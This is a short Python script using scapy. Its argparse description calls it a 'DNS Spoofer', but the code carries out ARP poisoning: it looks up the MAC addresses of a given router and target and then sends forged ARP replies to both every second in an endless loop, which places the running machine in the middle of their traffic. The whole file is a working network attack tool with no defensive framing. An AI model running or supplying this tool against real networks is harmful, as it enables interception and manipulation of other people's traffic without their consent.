from scapy.all import *
import time, utils, argparse

# Global Variables
routerIp=''
targetIp=''
targetMac=''
routerMac=''

parser = argparse.ArgumentParser(description='DNS Spoofer')
parser.add_argument('-rip', '--router_ip', dest='routerIp', help='Router IP Address', required=True)
parser.add_argument('-tip', '--target_ip', dest='targetIp', help='Target IP Address', required=True)
args = parser.parse_args()

def poison(targetIp, routerIp, targetMac, routerMac):
    """
    Performs ARP poison on router and target IPs
    :param targetIp: string
    :param routerIp: string
    :param targetMac: string
    :param routerMac: string
    """
    # Send ARP poison, every second
    while True:
        time.sleep(1)
        send(ARP(op=2, pdst=targetIp, psrc=routerIp, hwdst=targetMac))
        send(ARP(op=2, pdst=routerIp, psrc=targetIp, hwdst=routerMac))


if __name__ == "__main__":
    try:
        # Set variables from arguments
        routerIp = args.routerIp
        targetIp = args.targetIp
        # Get Mac Addresses based on given ips
        routerMac = utils.getHwAddrFromIp(routerIp)
        targetMac = utils.getHwAddrFromIp(targetIp)

        poison(targetIp, routerIp, targetMac, routerMac)
    except KeyboardInterrupt:
        print('Bye...')
